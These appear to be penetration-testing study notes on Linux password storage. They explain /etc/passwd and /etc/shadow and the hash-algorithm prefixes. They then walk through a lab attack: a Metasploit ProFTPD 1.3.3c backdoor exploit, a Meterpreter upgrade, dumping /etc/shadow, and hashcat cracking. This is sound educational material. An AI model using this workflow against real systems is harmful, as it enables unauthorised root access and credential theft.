## 🔐 Linux Password Storage Architecture

### Multi-User Risk & Design

- Linux supports **multiple concurrent users** → increases attack surface  
- **All account metadata** stored in `/etc/passwd`  
  - Readable by **any user** (by design)  
  - Contains: username, UID, GID, home directory, shell  
- **Actual password hashes** stored in `/etc/shadow`  
  - **Only readable by root** → critical security boundary  
  - Prevents non-privileged users from offline hash cracking  

> 💡 **Why this split?**  
> Legacy Unix systems stored hashes in `/etc/passwd` → world-readable = instant hash theft. Shadow file fixes this.

---
## 🔍 Hash Format & Algorithm Identification

### Structure in `/etc/shadow`
Each line:  
`username:$id$salt$hash:...`

The **`$id$`** field reveals the hashing algorithm:

| Value | Algorithm | Security Level |
|-------|----------|----------------|
| `$1$` | MD5 | **Weak** — crackable in seconds |
| `$2a$`, `$2y$` | Blowfish (bcrypt) | Strong |
| `$5$` | SHA-256 | Good |
| `$6$` | SHA-512 | **Strongest** (default on modern Linux) |

> ✅ Example:  
> `root:$6$TrOI4d8x$HnVwqZ...` → SHA-512 hash with salt `TrOI4d8x`

> ⚠️ **Note**: The `/etc/passwd` file **does NOT contain hashes** — only user info.  
> But if you see a hash in `/etc/passwd` (legacy systems), it means shadow is **disabled** → massive misconfiguration.

---
## 🛠️ Full Exploitation Workflow

### Step 1: Initial Access via ProFTPD Backdoor
- **Recon**:  
  ```bash
  nmap -sV 192.168.1.10
  # PORT   STATE SERVICE    VERSION
  # 21/tcp open  ftp        ProFTPD 1.3.3c
  ```
- **Exploit**:  
  ```msf
  searchsploit ProFTPD 1.3.3c
  # → "ProFTPD 1.3.3c - Backdoor Command Execution"
  use exploit/unix/ftp/proftpd_133c_backdoor
  set RHOSTS 192.168.1.10
  exploit
  ```
- **Result**: Direct **root shell** (`root@victim:/#`)

---
### Step 2: Background & Upgrade to Meterpreter
```msf
# In shell session:
Ctrl+Z → background
sessions          # Shows Session 1 (raw shell)
sessions -u 1     # Upgrades Session 1 to Meterpreter
```

> ❓ **Why upgrade?**  
> - Raw shells are **unstable** (easily killed by `Ctrl+C`)  
> - Meterpreter provides **post-exploitation modules** (e.g., `hashdump`)  
> - Enables file transfer, pivoting, and stable command execution  
> - Required for Metasploit’s automated hash extraction

✅ Result: **Session 2** = Meterpreter as root (`getuid` =>`uid=0` (root))

---
### Step 3: Manual Hash Extraction
```msf
meterpreter > cat /etc/shadow
```
Output:
```
root:$6$TrOI4d8x$HnVwqZ...:18295:0:99999:7:::
student:$6$KpL9mN2q$XyAbC...:18295:0:99999:7:::
```
→ Copy hashes for offline cracking (e.g., `hashcat -m 1800 hashes.txt wordlist.txt`)

---
### Step 4: Automated Hash Dumping
```msf
search post/linux/gather/hashdump
use post/linux/gather/hashdump
set SESSION 2
run
```

> 💡 **What "unshadow" means**:  
> - Combines `/etc/passwd` (usernames) + `/etc/shadow` (hashes)  
> - Outputs **crack-ready format**: `username:hash`  
> - Saves to `loot`

✅ Output:
```
[*] Hashes written to: /home/kali/.msf4/loot/.../linux.hashes.txt
root:$6$TrOI4d8x$HnVwqZ...
student:$6$KpL9mN2q$XyAbC...
```

> ⚠️ **Critical note**:  
> Only works because we have **root privileges** (`uid=0`). Non-root users **cannot read `/etc/shadow`**


